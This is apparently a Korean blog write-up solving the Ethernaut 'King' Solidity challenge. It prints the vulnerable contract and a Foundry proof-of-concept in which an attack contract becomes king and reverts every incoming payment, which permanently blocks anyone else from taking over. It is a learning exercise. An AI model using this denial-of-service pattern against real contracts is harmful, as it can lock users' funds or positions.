# The Ethernaut : King

> [Blog 원문](https://velog.io/@sane100400/The-Ethernaut-King)

## 핵심 개념

### Errors

Solidity는 `Panic(uint)`와 `Error(string)` 두 가지 기본 에러 타입을 제공한다. 사용자 정의 에러도 가능하며, `revert` 키워드로 트리거한다.

## 문제 컨트랙트

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
```

## 풀이

1. prize 금액을 확인하여 필요한 전송 금액 파악
2. 새 컨트랙트를 만들어 prize를 초과하는 금액 전송
3. 공격 컨트랙트가 새로운 King이 됨
4. `receive()` 함수에 revert 로직을 구현하여 수신 전송을 차단, King 지위를 영구 유지

## PoC

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {King} from "../src/King.sol";

contract Attack{
    address public target;

    constructor(address _target) payable {
        target = _target;
    }

    function beKing() public payable{
        payable(target).call{value: msg.value}("");
    }

    receive() external payable {
        revert("No Hack!");
    }
}

contract PoC is Script {
    address public target = 0xE5a027E485E82B80f68Dda0964e9C013e66B805B;
    uint256 pk = vm.envUint("PRIV_KEY");

    function run() public {
        vm.startBroadcast(pk);

        console.log(King(payable(target)).prize());
        uint256 prize = (King(payable(target)).prize())+1;

        Attack attack = new Attack(target);
        attack.beKing{value: prize}();

        vm.stopBroadcast();
    }
}
```
